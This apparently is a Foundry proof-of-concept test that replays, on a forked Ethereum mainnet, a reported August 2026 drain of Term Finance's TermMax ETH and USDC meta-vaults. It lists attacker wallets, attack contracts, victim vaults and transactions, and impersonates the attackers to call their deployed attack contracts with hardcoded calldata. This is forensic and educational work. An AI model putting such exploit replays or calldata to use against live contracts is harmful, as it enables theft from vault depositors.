// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Term Finance (TermMax vaults) — drain of the ETH and USDC meta-vaults on Ethereum, Aug 23 2026.
// Total extracted ~2,841.74 WETH + ~1,679,642 USDC (~$8.5M reported).
//
// IMPORTANT — mechanism differs from the brief that requested this PoC.
// The request framed this as a DAO governance-token capture (buy cheap vote token, pass
// propose/vote/queue/execute proposals, seize vaults) in the StrongBlock / BarnBridge class.
// The on-chain trace does NOT support that framing. There is no Governor, no vote token, and no
// proposal flow anywhere in the attacker's transactions. This is a smart-contract logic exploit
// against Term Finance's TermMax meta-vault accounting, driven by Aave V3 + Balancer V3 flash
// loans. The two attacker EOAs each deploy a bespoke attack contract days ahead, seed vault state,
// then trigger a single self-contained drain call. No stolen key, signer, or admin bypass; the
// privileged effect comes entirely from the attack contract exploiting the vault's own logic.
//
// Two coordinated attacker EOAs (both funded for gas via Tornado Cash, per Defimon):
//   Wallet A (ETH vault) : 0xa908b3472d76e7744baB0A5911768a4a6300612B
//   Wallet B (USDC vault): 0x686457a7468B9B31c5dbA43b1b16077B48520691
// Attack contracts (deployed earlier, still live at the drain blocks, called with hardcoded data):
//   Attack A : 0x64e477800051efb06ae4086f4b258b270668b4df  (selector 0x373058b8, no args)
//   Attack B : 0x4F4B614d2Aa533E6e3B11a6A32295Bd147Eba17f  (selector 0x8755b84e, uint[] [2,3,4,5,6])
// Proceeds consolidation (everything converted to ETH/DAI and sent here):
//   0xD5183d8BfC65a50863C62aF2538198A8288FFc13
//
// Victim contracts (Term Finance / TermMax), identified on-chain by name()/symbol():
//   ETH Meta Vault           tmvETH               0x26fcb50eec367ddab060ccf5e7394cecd95f7db2
//   Sub-vault Shorewoods ETH  tsvShorewoodsETH    0x330732581d30076137a1159b3ae8780158d902be
//   Sub-vault August Digital  tsvAugustDigitalETH 0xfc36c2edb18829308fa9ee9500e8be6520a47caf
//   Sub-vault Parity Prime    tsvParityPrimeETH   0x9f1c3173581ced1204136cbc628d2fb2407d7ac4
//   Sub-vault Parity Core     tsvParityCoreETH    0x76dd96710a73675d9cf9523a046f1587ca9031d4
//   Parity Core ETH token     pcETH               0xb7fc92b6ddc6612623812106e5b7532d3a48420b
//   Fixed Recipient WETH Exit frWETH-EXIT         0x184f2e57b4ce135181fa2a2166ac394339016338
// Flash-loan / liquidity infra touched: Aave V3 Pool 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2,
//   Balancer V3 Vault 0xbbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb, WETH, Aave stataEthWETH/aEthWETH.
//
// Exploit transactions (verified on-chain):
//   ETH  drain: 0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129  block 25816049
//               2,841.74 WETH out of the ETH meta-vault stack to Wallet A.
//   USDC drain: 0x9f273f9a5a20c2fc957b06bbfa45db486390eede4a7f44fbe1a2eb6744c2e8a0  block 25816159
//               1,679,642 USDC out of the USDC meta-vault stack to Wallet B (then swapped to DAI).
// Proceeds trace forward to consolidation 0xD5183d... : Wallet A sent 2,841.237 ETH
//   (tx 0xb3971d.../0x3e2a34...), Wallet B sent 1,679,642 DAI (tx 0xf91371...).
//
// PoC strategy (StrongBlock / BarnBridge replay style): the attack contracts and all seeded state
// are already settled on-chain. Fork one block before each drain and replay the exact hardcoded
// entry call from the corresponding attacker EOA. Assert the EOA's WETH / USDC balance rises by
// the reported amount. We do NOT reconstruct the vault-accounting bug from source — the attack
// contracts are unverified — so the drain entrypoints are treated as the on-chain root cause the
// trace shows, not confirmed source.
//
// Run: forge test --contracts ./src/test/2026-08/TermFinance_exp.sol -vvv
// Requires an Ethereum archive RPC (see foundry.toml [rpc_endpoints]).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract TermFinanceExp is Test {
    address constant WALLET_A = 0xa908b3472d76e7744baB0A5911768a4a6300612B; // ETH vault attacker
    address constant WALLET_B = 0x686457a7468B9B31c5dbA43b1b16077B48520691; // USDC vault attacker
    address constant ATTACK_A = 0x64E477800051EFb06Ae4086f4b258b270668b4dF;
    address constant ATTACK_B = 0x4F4B614d2Aa533E6e3B11a6A32295Bd147Eba17f;

    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // ETH-vault drain: bare selector, no arguments; uses state seeded in ATTACK_A on Aug 17.
    bytes constant DRAIN_A = hex"373058b8";
    // USDC-vault drain: selector 0x8755b84e with a uint256[] = [2,3,4,5,6] (vault/step indices).
    bytes constant DRAIN_B =
        hex"8755b84e"
        hex"0000000000000000000000000000000000000000000000000000000000000020"
        hex"0000000000000000000000000000000000000000000000000000000000000005"
        hex"0000000000000000000000000000000000000000000000000000000000000002"
        hex"0000000000000000000000000000000000000000000000000000000000000003"
        hex"0000000000000000000000000000000000000000000000000000000000000004"
        hex"0000000000000000000000000000000000000000000000000000000000000005"
        hex"0000000000000000000000000000000000000000000000000000000000000006";

    function testExploitETHVault() public {
        vm.createSelectFork("mainnet", 25816048); // one block before the ETH drain
        vm.label(WALLET_A, "AttackerA");
        vm.label(ATTACK_A, "AttackContractA");
        vm.label(address(WETH), "WETH");

        uint256 wethBefore = WETH.balanceOf(WALLET_A);
        emit log_named_decimal_uint("Wallet A WETH before", wethBefore, 18);

        vm.prank(WALLET_A, WALLET_A);
        (bool ok, ) = ATTACK_A.call(DRAIN_A);
        require(ok, "ETH vault drain reverted");

        uint256 stolen = WETH.balanceOf(WALLET_A) - wethBefore;
        emit log_named_decimal_uint("WETH drained from Term ETH meta-vault", stolen, 18);
        assertGt(stolen, 2800 ether, "expected ~2841 WETH drained");
    }

    function testExploitUSDCVault() public {
        vm.createSelectFork("mainnet", 25816158); // one block before the USDC drain
        vm.label(WALLET_B, "AttackerB");
        vm.label(ATTACK_B, "AttackContractB");
        vm.label(address(USDC), "USDC");

        uint256 usdcBefore = USDC.balanceOf(WALLET_B);
        emit log_named_decimal_uint("Wallet B USDC before", usdcBefore, 6);

        vm.prank(WALLET_B, WALLET_B);
        (bool ok, ) = ATTACK_B.call(DRAIN_B);
        require(ok, "USDC vault drain reverted");

        uint256 stolen = USDC.balanceOf(WALLET_B) - usdcBefore;
        emit log_named_decimal_uint("USDC drained from Term USDC meta-vault", stolen, 6);
        assertGt(stolen, 1_500_000e6, "expected ~1.68M USDC drained");
    }
}
